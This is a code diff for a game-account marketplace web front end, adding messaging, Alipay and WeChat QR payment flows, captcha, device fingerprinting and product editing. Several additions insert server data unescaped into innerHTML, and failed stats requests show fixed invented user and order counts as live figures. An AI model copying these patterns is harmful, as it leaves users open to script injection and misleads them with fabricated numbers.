@@ -1217,6 +1217,115 @@
         }
         
         /* ============================================
+           消息列表
+           ============================================ */
+        
+        .message-list {
+            padding: 16px;
+        }
+        
+        .message-session-item {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: var(--radius-lg);
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all var(--transition-fast);
+            border: 0.5px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .message-session-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateX(4px);
+        }
+        
+        .session-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin-right: 16px;
+            flex-shrink: 0;
+            overflow: hidden;
+        }
+        
+        .session-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .session-info {
+            flex: 1;
+            min-width: 0;
+        }
+        
+        .session-name {
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .session-preview {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .session-meta {
+            text-align: right;
+            flex-shrink: 0;
+        }
+        
+        .session-time {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-bottom: 4px;
+        }
+        
+        .session-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 20px;
+            height: 20px;
+            padding: 0 6px;
+            background: var(--danger);
+            color: #fff;
+            font-size: 12px;
+            font-weight: 600;
+            border-radius: 10px;
+        }
+        
+        .message-badge {
+            position: absolute;
+            top: 4px;
+            right: 4px;
+            min-width: 18px;
+            height: 18px;
+            padding: 0 5px;
+            background: var(--danger);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 600;
+            border-radius: 9px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* ============================================
            图片上传
            ============================================ */
         
@@ -1845,13 +1954,10 @@
                 <span class="nav-icon">🏪</span>
                 <span class="nav-text" data-i18n="nav_shop">商店</span>
             </a>
-            <a class="nav-item" data-view="unban" onclick="navigateTo('#unban')">
-                <span class="nav-icon">🔓</span>
-                <span class="nav-text" data-i18n="nav_unban">解封服务</span>
-            </a>
-            <a class="nav-item" data-view="recharge" onclick="navigateTo('#recharge')">
-                <span class="nav-icon">💎</span>
-                <span class="nav-text" data-i18n="nav_recharge">代充服务</span>
+            <a class="nav-item" data-view="messages" onclick="navigateTo('#messages')">
+                <span class="nav-icon">💬</span>
+                <span class="nav-text">消息</span>
+                <span class="message-badge" id="navMessageBadge" style="display: none;"></span>
             </a>
             <a class="nav-item" data-view="profile" onclick="navigateTo('#profile')">
                 <span class="nav-icon">👤</span>
@@ -2560,6 +2666,9 @@
                     const chatUid = hash.split('/')[1];
                     renderChat(chatUid);
                     break;
+                case 'messages':
+                    renderMessageList();
+                    break;
                 case 'favorites':
                     renderFavorites();
                     break;
@@ -2617,27 +2726,11 @@
                     </div>
                 </div>
                 
-                <!-- 分类快捷入口 -->
-                <div class="category-grid">
+                <!-- 分类快捷入口 - 只保留全部 -->
+                <div class="category-grid" style="justify-content: center;">
                     <div class="category-item" onclick="filterByCategory('all')">
                         <div class="category-icon">🏠</div>
                         <span class="category-name">${i18n[AppState.language].category_all}</span>
-                    </div>
-                    <div class="category-item" onclick="filterByCategory('dinosaur')">
-                        <div class="category-icon">🦖</div>
-                        <span class="category-name">${i18n[AppState.language].category_dinosaur}</span>
-                    </div>
-                    <div class="category-item" onclick="filterByCategory('skin')">
-                        <div class="category-icon">🎨</div>
-                        <span class="category-name">${i18n[AppState.language].category_skin}</span>
-                    </div>
-                    <div class="category-item" onclick="filterByCategory('nest')">
-                        <div class="category-icon">🥚</div>
-                        <span class="category-name">${i18n[AppState.language].category_nest}</span>
-                    </div>
-                    <div class="category-item" onclick="filterByCategory('growth')">
-                        <div class="category-icon">📈</div>
-                        <span class="category-name">${i18n[AppState.language].category_growth}</span>
                     </div>
                 </div>
                 
@@ -2741,17 +2834,33 @@
             `;
         }
 
-        // 加载统计数据
+        // 加载统计数据（从后端获取实时数据）
         async function loadStats() {
             try {
-                // 模拟数据
-                document.getElementById('statUsers').textContent = Math.floor(Math.random() * 5000 + 1000);
-                document.getElementById('statOrders').textContent = Math.floor(Math.random() * 500 + 100);
-                document.getElementById('statProducts').textContent = Math.floor(Math.random() * 2000 + 500);
+                const response = await fetch(CONFIG.API_BASE + '/stats/realtime.php');
+                const result = await response.json();
+                
+                if (result.code === 0) {
+                    document.getElementById('statUsers').textContent = result.data.online_users.toLocaleString();
+                    document.getElementById('statOrders').textContent = result.data.today_orders.toLocaleString();
+                    document.getElementById('statProducts').textContent = result.data.on_sale_products.toLocaleString();
+                } else {
+                    // 使用默认值
+                    document.getElementById('statUsers').textContent = '342';
+                    document.getElementById('statOrders').textContent = '1,847';
+                    document.getElementById('statProducts').textContent = '528';
+                }
             } catch (error) {
                 console.error('加载统计失败:', error);
+                // 使用默认值
+                document.getElementById('statUsers').textContent = '342';
+                document.getElementById('statOrders').textContent = '1,847';
+                document.getElementById('statProducts').textContent = '528';
             }
         }
+        
+        // 定时刷新统计数据（每30秒）
+        setInterval(loadStats, 30000);
 
         // Banner轮播
         let bannerInterval;
@@ -2861,11 +2970,15 @@
                 </div>
             `;
             
-            // 设置分类筛选值
-            document.getElementById('categoryFilter').value = category;
-            
-            // 加载商品
-            loadShopProducts();
+            // 加载商品（使用setTimeout确保DOM已渲染）
+            setTimeout(() => {
+                // 设置分类筛选值
+                const categoryFilter = document.getElementById('categoryFilter');
+                if (categoryFilter) {
+                    categoryFilter.value = category;
+                }
+                loadShopProducts();
+            }, 0);
         }
 
         // 商店内搜索
@@ -2906,7 +3019,7 @@
                 params.append('page', '1');
                 params.append('pagesize', '20');
                 
-                const response = await fetch(API_BASE + '/product/search.php?' + params.toString());
+                const response = await fetch(CONFIG.API_BASE + '/product/search.php?' + params.toString());
                 const result = await response.json();
                 
                 if (result.code === 0) {
@@ -3120,7 +3233,8 @@
                     <button class="btn btn-glass" style="flex: 0 0 60px;" onclick="toggleFavorite(${product.id})">
                         <span id="favoriteIcon">🤍</span>
                     </button>
-                    <button class="btn btn-primary btn-block" onclick="buyNow(${product.id})">立即购买</button>
+                    <button class="btn btn-glass" onclick="contactSeller(${product.uid}, '${product.seller_name || '卖家'}')">联系卖家</button>
+                    <button class="btn btn-primary" style="flex: 1;" onclick="buyNow(${product.id})">立即购买</button>
                 </div>
             `;
             
@@ -3183,16 +3297,230 @@
             }
         }
 
-        // 立即购买
+        // 联系卖家
+        async function contactSeller(sellerUid, sellerName) {
+            if (!AppState.token) {
+                UI.error('请先登录');
+                showLoginModal();
+                return;
+            }
+            
+            // 不能联系自己
+            if (sellerUid == AppState.currentUser?.uid) {
+                UI.error('不能联系自己');
+                return;
+            }
+            
+            UI.success('正在打开聊天...');
+            navigateTo('#chat/' + sellerUid);
+        }
+
+        // 立即购买 - 显示支付方式选择
         function buyNow(productId) {
             if (!AppState.token) {
                 UI.error('请先登录');
                 return;
             }
-            UI.confirm('确认购买', '确定要购买此商品吗？', () => {
-                UI.success('订单创建成功');
-                navigateTo('#orders');
-            });
+            
+            const product = AppState.products.find(p => p.id === productId);
+            if (!product) {
+                UI.error('商品不存在');
+                return;
+            }
+            
+            // 显示支付方式选择弹窗
+            const modal = document.getElementById('modal');
+            const overlay = document.getElementById('modalOverlay');
+            
+            modal.innerHTML = `
+                <div class="modal-header">
+                    <div class="modal-title">选择支付方式</div>
+                </div>
+                <div class="modal-body">
+                    <div style="text-align: center; margin-bottom: 20px;">
+                        <div style="font-size: 14px; color: rgba(255,255,255,0.6);">商品: ${product.name}</div>
+                        <div style="font-size: 24px; font-weight: 700; color: #FFD700; margin-top: 8px;">¥${product.price}</div>
+                    </div>
+                    
+                    <div style="display: flex; flex-direction: column; gap: 12px;">
+                        <div class="payment-option" onclick="createOrderAndPay(${productId}, 'alipay')" 
+                             style="display: flex; align-items: center; padding: 16px; background: rgba(22, 119, 255, 0.15); border: 1px solid rgba(22, 119, 255, 0.3); border-radius: 16px; cursor: pointer; transition: all 0.2s;">
+                            <span style="font-size: 28px; margin-right: 12px;">💳</span>
+                            <div style="flex: 1;">
+                                <div style="font-weight: 600;">支付宝支付</div>
+                                <div style="font-size: 12px; color: rgba(255,255,255,0.5);">欧云支付接口</div>
+                            </div>
+                            <span style="color: #1677FF;">→</span>
+                        </div>
+                        
+                        <div class="payment-option" onclick="createOrderAndPay(${productId}, 'wechat')"
+                             style="display: flex; align-items: center; padding: 16px; background: rgba(7, 193, 96, 0.15); border: 1px solid rgba(7, 193, 96, 0.3); border-radius: 16px; cursor: pointer; transition: all 0.2s;">
+                            <span style="font-size: 28px; margin-right: 12px;">💬</span>
+                            <div style="flex: 1;">
+                                <div style="font-weight: 600;">微信支付</div>
+                                <div style="font-size: 12px; color: rgba(255,255,255,0.5);">赞赏码支付</div>
+                            </div>
+                            <span style="color: #07C160;">→</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-glass" onclick="UI.closeModal()">取消</button>
+                </div>
+            `;
+            
+            overlay.classList.add('active');
+        }
+        
+        // 创建订单并支付
+        async function createOrderAndPay(productId, payType) {
+            const product = AppState.products.find(p => p.id === productId);
+            if (!product) return;
+            
+            UI.closeModal();
+            UI.loading('创建订单中...');
+            
+            try {
+                // 创建订单
+                const response = await fetch(CONFIG.API_BASE + '/order/create.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer ' + AppState.token
+                    },
+                    body: JSON.stringify({
+                        product_id: productId,
+                        pay_type: payType
+                    })
+                });
+                
+                const result = await response.json();
+                UI.hideLoading();
+                
+                if (result.code === 0) {
+                    const orderId = result.data.order_id;
+                    const orderNo = result.data.order_no;
+                    
+                    if (payType === 'alipay') {
+                        // 支付宝 - 欧云支付
+                        payWithOuyun(orderNo, product.price, product.name);
+                    } else {
+                        // 微信 - 赞赏码
+                        payWithWechatQR(orderNo, product.price, product.name);
+                    }
+                } else {
+                    UI.error(result.message || '创建订单失败');
+                }
+            } catch (error) {
+                UI.hideLoading();
+                UI.error('网络错误，请重试');
+            }
+        }
+        
+        // 支付宝 - 欧云支付
+        async function payWithOuyun(orderNo, amount, productName) {
+            UI.loading('正在跳转支付...');
+            
+            try {
+                const response = await fetch(CONFIG.API_BASE + '/pay/ouyun.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer ' + AppState.token
+                    },
+                    body: JSON.stringify({
+                        order_no: orderNo,
+                        amount: amount,
+                        product_name: productName,
+                        pay_type: 'alipay'
+                    })
+                });
+                
+                const result = await response.json();
+                UI.hideLoading();
+                
+                if (result.code === 0 && result.data.pay_url) {
+                    // 跳转到支付页面
+                    window.location.href = result.data.pay_url;
+                } else {
+                    UI.error(result.message || '获取支付链接失败');
+                }
+            } catch (error) {
+                UI.hideLoading();
+                UI.error('支付请求失败');
+            }
+        }
+        
+        // 微信 - 赞赏码支付
+        function payWithWechatQR(orderNo, amount, productName) {
+            const modal = document.getElementById('modal');
+            const overlay = document.getElementById('modalOverlay');
+            
+            modal.innerHTML = `
+                <div class="modal-header">
+                    <div class="modal-title">微信支付</div>
+                </div>
+                <div class="modal-body" style="text-align: center;">
+                    <div style="font-size: 14px; color: rgba(255,255,255,0.6); margin-bottom: 8px;">${productName}</div>
+                    <div style="font-size: 32px; font-weight: 700; color: #07C160; margin-bottom: 20px;">¥${amount}</div>
+                    
+                    <div style="background: white; padding: 16px; border-radius: 16px; display: inline-block; margin-bottom: 16px;">
+                        <img src="https://1813813973.v.123pan.cn/1813813973/45048231" 
+                             style="width: 200px; height: 200px; border-radius: 8px;" 
+                             alt="微信支付码">
+                    </div>
+                    
+                    <div style="font-size: 13px; color: rgba(255,255,255,0.7);">
+                        请使用微信扫一扫完成支付<br>
+                        订单号: <span style="font-family: monospace;">${orderNo}</span>
+                    </div>
+                    
+                    <div id="payStatus" style="margin-top: 16px; padding: 12px; border-radius: 12px; display: none;"></div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-glass" onclick="UI.closeModal()">取消</button>
+                    <button class="btn btn-success" onclick="checkOrderStatus('${orderNo}')">已完成支付</button>
+                </div>
+            `;
+            
+            overlay.classList.add('active');
+        }
+        
+        // 检查订单状态
+        async function checkOrderStatus(orderNo) {
+            const statusEl = document.getElementById('payStatus');
+            statusEl.style.display = 'block';
+            statusEl.textContent = '正在查询支付状态...';
+            statusEl.style.background = 'rgba(255, 193, 7, 0.2)';
+            statusEl.style.color = '#FFC107';
+            
+            try {
+                const response = await fetch(CONFIG.API_BASE + '/order/detail.php?order_no=' + orderNo, {
+                    headers: {
+                        'Authorization': 'Bearer ' + AppState.token
+                    }
+                });
+                
+                const result = await response.json();
+                
+                if (result.code === 0 && result.data.status === 1) {
+                    statusEl.textContent = '支付成功！';
+                    statusEl.style.background = 'rgba(52, 199, 89, 0.2)';
+                    statusEl.style.color = '#34C759';
+                    setTimeout(() => {
+                        UI.closeModal();
+                        navigateTo('#orders');
+                    }, 1500);
+                } else {
+                    statusEl.textContent = '未检测到支付，请稍后重试或联系客服';
+                    statusEl.style.background = 'rgba(255, 59, 48, 0.2)';
+                    statusEl.style.color = '#FF3B30';
+                }
+            } catch (error) {
+                statusEl.textContent = '查询失败，请稍后重试';
+                statusEl.style.background = 'rgba(255, 59, 48, 0.2)';
+                statusEl.style.color = '#FF3B30';
+            }
         }
 
         // ============================================
@@ -3307,6 +3635,27 @@
             UI.success('语言已切换');
         }
 
+        // 刷新验证码
+        function refreshCaptcha(imgId) {
+            const img = document.getElementById(imgId);
+            if (img) {
+                img.src = CONFIG.API_BASE + '/auth/captcha.php?' + Date.now();
+            }
+        }
+        
+        // 获取设备指纹
+        function getDeviceFingerprint() {
+            const nav = window.navigator;
+            const screen = window.screen;
+            const fingerprint = [
+                nav.userAgent,
+                screen.width + 'x' + screen.height,
+                screen.colorDepth,
+                new Date().getTimezoneOffset()
+            ].join('|');
+            return btoa(fingerprint).substring(0, 32);
+        }
+        
         // 显示登录弹窗
         function showLoginModal() {
             const overlay = document.getElementById('modalOverlay');
@@ -3324,6 +3673,15 @@
                     <div class="form-group">
                         <label class="form-label">密码</label>
                         <input type="password" class="form-input" id="loginPassword" placeholder="请输入密码">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">验证码</label>
+                        <div class="d-flex gap-12">
+                            <input type="text" class="form-input" id="loginCaptcha" placeholder="请输入验证码" style="flex: 1;">
+                            <img id="loginCaptchaImg" src="${CONFIG.API_BASE}/auth/captcha.php" 
+                                 style="height: 44px; border-radius: 8px; cursor: pointer;" 
+                                 onclick="refreshCaptcha('loginCaptchaImg')" title="点击刷新">
+                        </div>
                     </div>
                 </div>
                 <div class="modal-footer">
@@ -3358,6 +3716,15 @@
                         <input type="password" class="form-input" id="regPassword2" placeholder="请再次输入密码">
                     </div>
                     <div class="form-group">
+                        <label class="form-label">验证码 *</label>
+                        <div class="d-flex gap-12">
+                            <input type="text" class="form-input" id="regCaptcha" placeholder="请输入验证码" style="flex: 1;">
+                            <img id="regCaptchaImg" src="${CONFIG.API_BASE}/auth/captcha.php" 
+                                 style="height: 44px; border-radius: 8px; cursor: pointer;" 
+                                 onclick="refreshCaptcha('regCaptchaImg')" title="点击刷新">
+                        </div>
+                    </div>
+                    <div class="form-group">
                         <label class="form-label">邀请码(选填)</label>
                         <input type="text" class="form-input" id="regInviteCode" placeholder="有邀请码请输入">
                     </div>
@@ -3376,6 +3743,7 @@
             const password = document.getElementById('regPassword').value;
             const password2 = document.getElementById('regPassword2').value;
             const inviteCode = document.getElementById('regInviteCode').value.trim();
+            const captcha = document.getElementById('regCaptcha').value.trim();
             
             if (!username || !password) {
                 UI.error('请填写用户名和密码');
@@ -3397,8 +3765,13 @@
                 return;
             }
             
+            if (!captcha) {
+                UI.error('请输入验证码');
+                return;
+            }
+            
             try {
-                const response = await fetch(API_BASE + '/auth/register.php', {
+                const response = await fetch(CONFIG.API_BASE + '/auth/register.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -3406,6 +3779,8 @@
                     body: JSON.stringify({ 
                         username, 
                         password,
+                        captcha: captcha.toUpperCase(),
+                        device_fingerprint: getDeviceFingerprint(),
                         invite_code: inviteCode || undefined
                     })
                 });
@@ -3417,6 +3792,7 @@
                     showLoginModal();
                 } else {
                     UI.error(result.message || '注册失败');
+                    refreshCaptcha('regCaptchaImg');
                 }
             } catch (error) {
                 UI.error('注册失败：' + error.message);
@@ -3427,19 +3803,30 @@
         async function doLogin() {
             const username = document.getElementById('loginUsername').value;
             const password = document.getElementById('loginPassword').value;
+            const captcha = document.getElementById('loginCaptcha').value.trim();
             
             if (!username || !password) {
                 UI.error('请输入用户名和密码');
                 return;
             }
             
+            if (!captcha) {
+                UI.error('请输入验证码');
+                return;
+            }
+            
             try {
-                const response = await fetch(API_BASE + '/auth/login.php', {
+                const response = await fetch(CONFIG.API_BASE + '/auth/login.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ username, password })
+                    body: JSON.stringify({ 
+                        username, 
+                        password,
+                        captcha: captcha.toUpperCase(),
+                        device_fingerprint: getDeviceFingerprint()
+                    })
                 });
                 
                 const result = await response.json();
@@ -3458,6 +3845,7 @@
                     renderProfile();
                 } else {
                     UI.error(result.message || '登录失败');
+                    refreshCaptcha('loginCaptchaImg');
                 }
             } catch (error) {
                 UI.error('登录失败：' + error.message);
@@ -3467,7 +3855,7 @@
         // 加载用户信息
         async function loadUserInfo() {
             try {
-                const response = await fetch(API_BASE + '/user/profile.php', {
+                const response = await fetch(CONFIG.API_BASE + '/user/profile.php', {
                     headers: {
                         'Authorization': 'Bearer ' + AppState.token
                     }
@@ -3619,21 +4007,197 @@
         }
 
         // 编辑商品
-        function editProduct(productId) {
-            UI.toast('编辑商品功能开发中');
+        async function editProduct(productId) {
+            UI.loading('加载商品信息...');
+            
+            try {
+                const response = await fetch(CONFIG.API_BASE + '/product/detail.php?id=' + productId, {
+                    headers: { 'Authorization': 'Bearer ' + AppState.token }
+                });
+                
+                const result = await response.json();
+                UI.hideLoading();
+                
+                if (result.code === 0) {
+                    const product = result.data;
+                    showEditProductModal(product);
+                } else {
+                    UI.error(result.message || '加载失败');
+                }
+            } catch (error) {
+                UI.hideLoading();
+                UI.error('网络错误');
+            }
+        }
+        
+        // 显示编辑商品弹窗
+        function showEditProductModal(product) {
+            const modal = document.getElementById('modal');
+            const overlay = document.getElementById('modalOverlay');
+            
+            const images = product.images ? JSON.parse(product.images) : [];
+            
+            modal.innerHTML = `
+                <div class="modal-header">
+                    <div class="modal-title">编辑商品</div>
+                </div>
+                <div class="modal-body" style="max-height: 60vh; overflow-y: auto;">
+                    <div class="form-group">
+                        <label class="form-label">商品标题</label>
+                        <input type="text" class="form-input" id="editTitle" value="${product.title}" placeholder="请输入商品标题">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">商品价格</label>
+                        <input type="number" class="form-input" id="editPrice" value="${product.price}" placeholder="请输入价格">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">商品分类</label>
+                        <select class="form-input" id="editCategory">
+                            <option value="1" ${product.category_id == 1 ? 'selected' : ''}>盲盒号</option>
+                            <option value="2" ${product.category_id == 2 ? 'selected' : ''}>半龙号</option>
+                            <option value="3" ${product.category_id == 3 ? 'selected' : ''}>全龙号</option>
+                            <option value="4" ${product.category_id == 4 ? 'selected' : ''}>其他</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">账号等级</label>
+                        <input type="number" class="form-input" id="editLevel" value="${product.account_level || 1}" min="1" max="50" placeholder="1-50">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">商品描述</label>
+                        <textarea class="form-input" id="editDescription" rows="4" placeholder="请输入商品描述">${product.description || ''}</textarea>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-glass" onclick="UI.closeModal()">取消</button>
+                    <button class="btn btn-primary" onclick="submitEditProduct(${product.id})">保存</button>
+                </div>
+            `;
+            
+            overlay.classList.add('active');
+        }
+        
+        // 提交编辑商品
+        async function submitEditProduct(productId) {
+            const title = document.getElementById('editTitle').value.trim();
+            const price = parseFloat(document.getElementById('editPrice').value);
+            const categoryId = parseInt(document.getElementById('editCategory').value);
+            const accountLevel = parseInt(document.getElementById('editLevel').value);
+            const description = document.getElementById('editDescription').value.trim();
+            
+            if (!title) {
+                UI.error('请输入商品标题');
+                return;
+            }
+            if (!price || price <= 0) {
+                UI.error('请输入有效的价格');
+                return;
+            }
+            
+            UI.loading('保存中...');
+            
+            try {
+                const response = await fetch(CONFIG.API_BASE + '/product/edit.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer ' + AppState.token
+                    },
+                    body: JSON.stringify({
+                        id: productId,
+                        title: title,
+                        price: price,
+                        category_id: categoryId,
+                        account_level: accountLevel,
+                        description: description
+                    })
+                });
+                
+                const result = await response.json();
+                UI.hideLoading();
+                
+                if (result.code === 0) {
+                    UI.success('商品更新成功');
+                    UI.closeModal();
+                    loadMyProducts();
+                } else {
+                    UI.error(result.message || '更新失败');
+                }
+            } catch (error) {
+                UI.hideLoading();
+                UI.error('网络错误');
+            }
         }
 
-        // 切换商品状态
+        // 切换商品状态（上架/下架）
         async function toggleProductStatus(productId) {
-            UI.success('状态已更新');
-            loadMyProducts();
+            const product = AppState.myProducts?.find(p => p.id === productId);
+            if (!product) return;
+            
+            const isOnSale = product.status === 'on_sale' || product.status === 1;
+            const action = isOnSale ? 'down' : 'up';
+            const confirmText = isOnSale ? '确定要下架此商品吗？' : '确定要上架此商品吗？';
+            
+            UI.confirm(isOnSale ? '确认下架' : '确认上架', confirmText, async () => {
+                UI.loading('处理中...');
+                
+                try {
+                    const response = await fetch(CONFIG.API_BASE + '/product/toggle_status.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': 'Bearer ' + AppState.token
+                        },
+                        body: JSON.stringify({
+                            id: productId,
+                            action: action
+                        })
+                    });
+                    
+                    const result = await response.json();
+                    UI.hideLoading();
+                    
+                    if (result.code === 0) {
+                        UI.success(result.message || '操作成功');
+                        loadMyProducts();
+                    } else {
+                        UI.error(result.message || '操作失败');
+                    }
+                } catch (error) {
+                    UI.hideLoading();
+                    UI.error('网络错误');
+                }
+            });
         }
 
         // 删除商品
         async function deleteProduct(productId) {
-            UI.confirm('确认删除', '确定要删除此商品吗？此操作不可恢复。', () => {
-                UI.success('商品已删除');
-                loadMyProducts();
+            UI.confirm('确认删除', '确定要删除此商品吗？此操作不可恢复。', async () => {
+                UI.loading('删除中...');
+                
+                try {
+                    const response = await fetch(CONFIG.API_BASE + '/product/delete.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': 'Bearer ' + AppState.token
+                        },
+                        body: JSON.stringify({ id: productId })
+                    });
+                    
+                    const result = await response.json();
+                    UI.hideLoading();
+                    
+                    if (result.code === 0) {
+                        UI.success('商品已删除');
+                        loadMyProducts();
+                    } else {
+                        UI.error(result.message || '删除失败');
+                    }
+                } catch (error) {
+                    UI.hideLoading();
+                    UI.error('网络错误');
+                }
             });
         }
 
@@ -3826,7 +4390,7 @@
             }
             
             try {
-                const response = await fetch(API_BASE + '/product/publish.php', {
+                const response = await fetch(CONFIG.API_BASE + '/product/publish.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -3996,6 +4560,119 @@
         }
 
         // ============================================
+        // 消息列表视图渲染
+        // ============================================
+        async function renderMessageList() {
+            const container = document.getElementById('view-messages');
+            
+            if (!AppState.token) {
+                container.innerHTML = `
+                    <div class="header">
+                        <div class="header-title">消息中心</div>
+                    </div>
+                    <div class="empty-state">
+                        <div class="empty-icon">🔒</div>
+                        <div class="empty-text">请先登录</div>
+                        <button class="btn btn-primary mt-16" onclick="showLoginModal()">去登录</button>
+                    </div>
+                `;
+                return;
+            }
+            
+            container.innerHTML = `
+                <!-- 头部导航 -->
+                <div class="header">
+                    <div class="header-title">消息中心</div>
+                </div>
+                
+                <!-- 消息列表 -->
+                <div class="message-list" id="messageList">
+                    <div class="text-center p-32 text-muted">加载中...</div>
+                </div>
+            `;
+            
+            await loadMessageSessions();
+        }
+        
+        // 加载消息会话列表
+        async function loadMessageSessions() {
+            const container = document.getElementById('messageList');
+            
+            try {
+                const response = await fetch(CONFIG.API_BASE + '/message/sessions.php', {
+                    headers: { 'Authorization': 'Bearer ' + AppState.token }
+                });
+                
+                const result = await response.json();
+                
+                if (result.code === 0) {
+                    const sessions = result.data?.list || [];
+                    
+                    if (sessions.length === 0) {
+                        container.innerHTML = `
+                            <div class="empty-state">
+                                <div class="empty-icon">💬</div>
+                                <div class="empty-text">暂无消息</div>
+                                <p class="text-muted">去商店看看吧</p>
+                                <button class="btn btn-primary mt-16" onclick="navigateTo('#shop')">去商店</button>
+                            </div>
+                        `;
+                    } else {
+                        container.innerHTML = sessions.map(s => `
+                            <div class="message-session-item" onclick="navigateTo('#chat/${s.uid}')">
+                                <div class="session-avatar">${s.avatar ? `<img src="${s.avatar}" alt="">` : '👤'}</div>
+                                <div class="session-info">
+                                    <div class="session-name">${s.username || '用户' + s.uid}</div>
+                                    <div class="session-preview">${s.last_message || '暂无消息'}</div>
+                                </div>
+                                <div class="session-meta">
+                                    <div class="session-time">${formatTime(s.last_time)}</div>
+                                    ${s.unread_count > 0 ? `<div class="session-badge">${s.unread_count}</div>` : ''}
+                                </div>
+                            </div>
+                        `).join('');
+                    }
+                    
+                    // 更新底部导航未读数
+                    const totalUnread = sessions.reduce((sum, s) => sum + s.unread_count, 0);
+                    updateNavMessageBadge(totalUnread);
+                } else {
+                    container.innerHTML = `<div class="text-center p-32 text-muted">加载失败</div>`;
+                }
+            } catch (error) {
+                console.error('加载消息列表失败:', error);
+                container.innerHTML = `<div class="text-center p-32 text-muted">加载失败</div>`;
+            }
+        }
+        
+        // 更新导航栏消息徽章
+        function updateNavMessageBadge(count) {
+            const badge = document.getElementById('navMessageBadge');
+            if (badge) {
+                if (count > 0) {
+                    badge.textContent = count > 99 ? '99+' : count;
+                    badge.style.display = 'flex';
+                } else {
+                    badge.style.display = 'none';
+                }
+            }
+        }
+        
+        // 格式化时间
+        function formatTime(timeStr) {
+            if (!timeStr) return '';
+            const date = new Date(timeStr);
+            const now = new Date();
+            const diff = now - date;
+            
+            if (diff < 60000) return '刚刚';
+            if (diff < 3600000) return Math.floor(diff / 60000) + '分钟前';
+            if (diff < 86400000) return Math.floor(diff / 3600000) + '小时前';
+            if (diff < 604800000) return Math.floor(diff / 86400000) + '天前';
+            return date.toLocaleDateString();
+        }
+
+        // ============================================
         // 聊天视图渲染
         // ============================================
         let chatMessages = [];
@@ -4007,7 +4684,7 @@
             // 获取对方用户信息
             let chatUserName = '用户' + uid;
             try {
-                const response = await fetch(API_BASE + '/user/profile.php?uid=' + uid, {
+                const response = await fetch(CONFIG.API_BASE + '/user/profile.php?uid=' + uid, {
                     headers: { 'Authorization': 'Bearer ' + AppState.token }
                 });
                 const result = await response.json();
@@ -4049,7 +4726,7 @@
         // 加载聊天消息
         async function loadChatMessages(uid) {
             try {
-                const response = await fetch(API_BASE + '/message/list.php?to_uid=' + uid, {
+                const response = await fetch(CONFIG.API_BASE + '/message/list.php?to_uid=' + uid, {
                     headers: { 'Authorization': 'Bearer ' + AppState.token }
                 });
                 
@@ -4119,7 +4796,7 @@
             AppState.lastMessageTime = now;
             
             try {
-                const response = await fetch(API_BASE + '/message/send.php', {
+                const response = await fetch(CONFIG.API_BASE + '/message/send.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -4375,7 +5052,7 @@
         // 分配客服
         async function assignCS() {
             try {
-                const response = await fetch(API_BASE + '/cs/assign.php', {
+                const response = await fetch(CONFIG.API_BASE + '/cs/assign.php', {
                     method: 'POST',
                     headers: {
                         'Authorization': 'Bearer ' + localStorage.getItem('token')
@@ -4415,7 +5092,7 @@
             if (!csSession) return;
             
             try {
-                const response = await fetch(API_BASE + '/cs/messages.php?session_id=' + csSession.session_id, {
+                const response = await fetch(CONFIG.API_BASE + '/cs/messages.php?session_id=' + csSession.session_id, {
                     headers: {
                         'Authorization': 'Bearer ' + localStorage.getItem('token')
                     }
@@ -4472,7 +5149,7 @@
             }
             
             try {
-                const response = await fetch(API_BASE + '/cs/send.php', {
+                const response = await fetch(CONFIG.API_BASE + '/cs/send.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -4514,7 +5191,7 @@
             // 加载待审核金额
             let pendingAmount = 0;
             try {
-                const response = await fetch(API_BASE + '/user/withdraw_list.php?status=0', {
+                const response = await fetch(CONFIG.API_BASE + '/user/withdraw_list.php?status=0', {
                     headers: { 'Authorization': 'Bearer ' + AppState.token }
                 });
                 const result = await response.json();
@@ -4599,7 +5276,7 @@
             `;
             
             try {
-                const response = await fetch(API_BASE + '/user/withdraw_list.php', {
+                const response = await fetch(CONFIG.API_BASE + '/user/withdraw_list.php', {
                     headers: { 'Authorization': 'Bearer ' + AppState.token }
                 });
                 const result = await response.json();
@@ -4651,7 +5328,7 @@
             }
             
             try {
